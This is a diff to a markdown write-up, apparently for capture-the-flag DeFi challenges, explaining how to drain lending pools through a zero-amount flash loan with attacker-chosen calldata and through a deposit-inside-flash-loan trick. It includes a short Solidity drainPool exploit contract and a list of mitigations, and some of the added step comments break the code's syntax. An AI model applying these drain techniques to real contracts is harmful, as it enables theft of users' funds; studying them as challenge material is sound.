@@ -123,19 +123,19 @@ contract under the `contracts` folder):
 
 This would be the shorter solution. To understand how this could be performed in a single txn lets see how flashloans are executed.
 
-1. A receiver contract containing the `receive` function with the required structure by the pool, calls for the `flashLoan`
+1. A receiver contract containing the ```receive``` function with the required structure by the pool, calls for the ```flashLoan```
 2. Once the tokens arrive to the receiver, internal and desired transactions are performed (e.g. arbitrage).
 3. When the internal transactions are finished, the receiver contract **must** send the tokens back to the pool.
 
-The exploit can be done in a single transaction because the `flashLoan` function does not checks that the requested amount is **greater than zero**, this makes the _step 3_ not required (because if I don't ask for tokens, I am not obliged to return anything!).
+The exploit can be done in a single transaction because the ```flashLoan``` function does not checks that the requested amount is **greater than zero**, this makes the _step 3_ not required (because if I don't ask for tokens, I am not obliged to return anything!).
 
-The same exploit can be done while requesting tokens (more than zero), executing the `approval` for the pool balance, returning back the requested amount and in a former transaction call the `transferFrom` method and drain the `TrusterLenderPool`.
+The same exploit can be done while requesting tokens (more than zero), executing the ```approval``` for the pool balance, returning back the requested amount and in a former transaction call the ```transferFrom``` method and drain the `TrusterLenderPool`.
 
 ### Learnings - Mitigations
 
-- Respecting the `flashloan` basic contract structure is a must.
-- If the pool is only lending with the `loan` function, check that the requested amount is greater than zero. _Go elsewhere to ask for zero tokenz, we ar a sekur protokol pal._
-- Give a fixed calldata structure inside the `loan` function to prevent malicious calls. Do not request it as a parameter.
+- Respecting the ```flashloan``` basic contract structure is a must.
+- If the pool is only lending with the ```loan``` function, check that the requested amount is greater than zero. _Go elsewhere to ask for zero tokenz, we ar a sekur protokol pal._
+- Give a fixed calldata structure inside the ```loan``` function to prevent malicious calls. Do not request it as a parameter.
 - To rely on logic, tokens can only be borrowed by contracts. Individual wallets cannot perform further logic such as contracts do.
 
 **And remember, if a suited guy flexing cars and watches comes by offering huge APY's, run away. It is a scheme.**
@@ -154,27 +154,27 @@ We need to look closely how does the balance of this contract is modified. Think
 We may trick the contract with the `deposit` and `withdraw` logic combined with the request for a `flashLoan`. If we follow this path we will be able to empty the contract:
 
 1. Ask for a loan for its whole balance.
-2. When the `execute` function is triggered, we can give the ethers back by calling `deposit`. This will make the pool balance to match the `require` condition and the `flashLoan` function will be mined completely. Also, this assigns the `SideCracker` contract a balance inside the `balances`mapping stored on the pool contract. In other words, we returned back the tokens but we assigned them as our property as for the pool logic.
-3. Because we now hold a balance as our property, we can simply call the `withdraw` function and draining the pool!
+2. When the ```execute``` function is triggered, we can give the ethers back by calling ```deposit```. This will make the pool balance to match the ```require``` condition and the ```flashLoan``` function will be mined completely. Also, this assigns the ```SideCracker``` contract a balance inside the `balances``` mapping stored on the pool contract. In other words, we returned back the tokens but we assigned them as our property as for the pool logic.
+3. Because we now hold a balance as our property, we can simply call the ```withdraw``` function and draining the pool!
 
 The contract that exploits this pool is within the same folder as the contract of this level but the logic will be something like this:
 
     receive() external payable {}
 
-    function drainPool() public {
-        callFlashLoan();
+    function drainPool() public {  
+        callFlashLoan(); // ---> Step 1: Triggering the loan
 
-        pool.withdraw();
-        payable(attacker).transfer(address(this).balance);
+        pool.withdraw(); ---> Step 4: Rekt
+        payable(attacker).transfer(address(this).balance); // ---> Step 5: Rekt V2
     }
 
-    function callFlashLoan() public {
+    function callFlashLoan() public { ---> Step 1
         uint256 poolBalance = address(pool).balance;
         pool.flashLoan(poolBalance);
     }
 
-    function execute() external payable {
-        pool.deposit{value: msg.value}();
+    function execute() external payable { // ---> Step 2: Receiving the funds
+        pool.deposit{value: msg.value}(); // ---> Step 3: "Paying" the loan back
     }
 
 Call `drainPool` and **kboom**!
